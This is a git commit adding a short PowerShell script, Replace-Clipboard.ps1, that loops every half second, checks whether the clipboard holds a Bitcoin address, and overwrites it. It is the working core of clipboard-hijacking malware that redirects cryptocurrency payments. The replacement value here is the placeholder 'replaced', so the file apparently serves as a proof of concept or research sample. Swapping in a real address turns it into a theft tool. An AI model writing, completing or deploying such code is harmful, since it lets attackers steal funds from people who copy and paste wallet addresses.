67b65dc3f360e10794cae17bc2057ad976b433d0
Itay Migdal <32266629+itaymigdal@users.noreply.github.com>
2022-11-27 12:49:47 +0200

    Add files via upload

---
+++ Replace-Clipboard.ps1
@@ -0,0 +1,15 @@
+﻿
+$regex = "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"  # Bitcoin address
+$replace_to = "replaced"
+
+while ($true)
+    {
+    sleep 0.5
+    $clipboard = Get-Clipboard
+    if ($clipboard -match $regex)
+        {
+        Set-Clipboard $replace_to
+        }
+    }
+
+    
